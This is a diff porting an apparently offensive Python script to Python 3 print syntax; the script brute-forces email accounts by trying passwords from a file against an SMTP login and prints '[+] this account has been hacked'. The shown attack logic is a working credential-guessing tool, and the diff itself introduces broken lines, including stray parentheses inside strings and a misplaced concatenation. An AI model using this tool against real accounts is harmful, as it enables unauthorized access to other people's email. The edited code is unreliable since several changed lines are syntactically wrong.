@@ -35,8 +35,8 @@ def main():
    print ('           ()                ')
 
 main()
-print '[1] start the brute force attack'
-print '[2] exit'
+print ('[1] start the brute force attack')
+print ('[2] exit')
 option = input('==>')
 if option == 1:
    file_path = raw_input('enter the path of passwords file :')
@@ -57,17 +57,17 @@ def login():
          server.login(user_name, password)
          system('clear')
          main()
-         print '\n'
-         print '[+] this account has been hacked, password :' + password + '     ^_^'
+         print ('\n')
+         print ('[+] this account has been hacked, password :' + password + ')     ^_^'
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
             system('clear')
             main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
+            print ('[+] this account has been hacked, password :' + password + ')     ^_^'
 
             break
          else:
-            print '[!] password not found => ' + password
+            print ('[!] password not found => ') + password
 login()
